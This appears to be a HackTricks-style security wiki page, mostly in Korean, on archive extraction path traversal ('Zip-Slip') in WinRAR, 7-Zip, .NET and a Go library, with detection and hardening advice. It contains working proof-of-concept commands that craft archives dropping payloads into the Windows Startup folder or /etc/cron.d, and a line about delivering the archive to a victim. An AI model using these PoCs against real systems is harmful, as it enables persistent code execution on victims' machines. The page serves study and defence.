# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 아카이브 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 항목에 고유한 **내부 경로**를 가질 수 있습니다. 추출 유틸리티가 그 경로를 무비판적으로 신뢰하면 `..` 또는 절대 경로(예: `C:\Windows\System32\`)를 포함한 조작된 파일명이 사용자가 선택한 디렉토리 외부에 기록됩니다.
이 취약성 범주는 널리 *Zip-Slip* 또는 **archive extraction path traversal**로 알려져 있습니다.

결과는 임의 파일 덮어쓰기부터 Windows *Startup* 폴더와 같은 **auto-run** 위치에 페이로드를 떨어뜨려 **remote code execution (RCE)**를 직접 달성하는 것까지 다양합니다.

## 근본 원인

1. 공격자가 하나 이상의 파일 헤더에 다음을 포함한 아카이브를 생성합니다:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. 피해자가 임베디드 경로를 신뢰(또는 symlinks를 따름)하는 취약한 도구로 아카이브를 추출하며, 경로를 정리하거나 선택한 디렉토리 아래로 강제 추출하지 않습니다.
3. 파일이 공격자가 제어하는 위치에 기록되고 시스템이나 사용자가 해당 경로를 다음에 트리거할 때 실행/로드됩니다.

### .NET `Path.Combine` + `ZipArchive` traversal

일반적인 .NET 안티패턴은 의도한 대상 경로를 **사용자 제어된** `ZipArchiveEntry.FullName`과 결합하고 경로 정규화 없이 추출하는 것입니다:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName`이 `..\\`로 시작하면 디렉터리 트래버설이 발생합니다; 만약 그것이 **absolute path**이면 왼쪽 구성 요소가 완전히 버려져 추출 정체성으로서 **arbitrary file write**를 발생시킵니다.
- Proof-of-concept 아카이브로, 예약된 스캐너가 감시하는 형제 디렉터리 `app`에 쓰기 위한:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
해당 ZIP을 모니터링되는 inbox에 넣으면 `C:\samples\app\0xdf.txt`가 생성되어 `C:\samples\queue\` 밖으로의 traversal를 입증하고 follow-on primitives(예: DLL hijacks)를 가능하게 합니다.

## 실제 사례 – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR( `rar` / `unrar` CLI, DLL 및 포터블 소스 포함)은 압축 해제 중 파일명을 검증하지 못했습니다.
다음과 같은 항목을 포함한 악의적인 RAR 아카이브:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
결과적으로 선택한 출력 디렉터리의 **외부**에 놓여 사용자 *Startup* 폴더 안으로 들어갑니다. 로그온 후 Windows는 그 안의 모든 항목을 자동으로 실행하여 *영구적인* RCE를 제공합니다.

### PoC 아카이브 생성 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
옵션 사용:
* `-ep`  – 파일 경로를 주어진 대로 정확히 저장 (선행 `./`를 자르지 않음).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **취약점**: ZIP 항목 중 **symbolic links**가 추출 중에 역참조되어, 공격자가 대상 디렉터리 밖으로 탈출해 임의 경로를 덮어쓸 수 있었습니다. 사용자 개입은 단지 아카이브를 *opening/extracting* 하는 것뿐입니다.
* **영향 대상**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **영향 경로**: 덮어쓰기 `Start Menu/Programs/Startup` 또는 서비스 실행 위치 → 다음 로그온 또는 서비스 재시작 시 코드가 실행됩니다.
* **빠른 PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
패치된 빌드에서는 `/etc/cron.d`가 건드려지지 않으며, symlink는 `/tmp/target` 내부에 링크로 추출됩니다.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **취약점**: `archiver.Unarchive()`가 `../` 및 symlinked ZIP 항목을 따라가며 `outputDir` 밖에 쓰기를 수행합니다.
* **영향 대상**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **수정 방법**: `mholt/archives` ≥ 0.1.0으로 전환하거나 쓰기 전에 정규 경로 검사를 구현하세요.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **정적 검사** – 아카이브 항목을 나열하고 이름에 `../`, `..\\`, *절대 경로* (`/`, `C:`)가 포함되었거나 추출 디렉터리 밖을 가리키는 *symlink* 타입 항목이 있는지 표시하세요.
* **정규화** – `realpath(join(dest, name))`가 여전히 `dest`로 시작하는지 확인하세요. 그렇지 않으면 거부합니다.
* **샌드박스 추출** – 일회성 디렉터리로 압축을 풀고 *safe* extractor(예: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00)를 사용하여 결과 경로가 디렉터리 내부에 남아 있는지 검증하세요.
* **엔드포인트 모니터링** – WinRAR/7-Zip/etc.로 아카이브가 열린 직후 `Startup`/`Run`/`cron` 위치에 새 실행 파일이 써지는 경우 경보를 발생시키세요.

## Mitigation & Hardening

1. **추출기 업데이트** – WinRAR 7.13+와 7-Zip 25.00+는 경로/심볼릭 링크 정리를 구현했습니다. 두 도구 모두 자동 업데이트 기능은 부족합니다.
2. 가능한 경우 “**Do not extract paths**” / “**Ignore paths**” 옵션으로 아카이브를 추출하세요.
3. Unix에서는 추출 전에 권한을 낮추고 **chroot/namespace**를 마운트하세요; Windows에서는 **AppContainer** 또는 샌드박스를 사용하세요.
4. 커스텀 코드를 작성하는 경우 생성/쓰기 전에 `realpath()`/`PathCanonicalize()`로 경로를 정규화하고 목적지를 벗어나는 항목은 거부하세요.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* 쓰기 전에 `PathCanonicalize` / `realpath`를 호출하지 않는 모든 커스텀 추출 로직.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
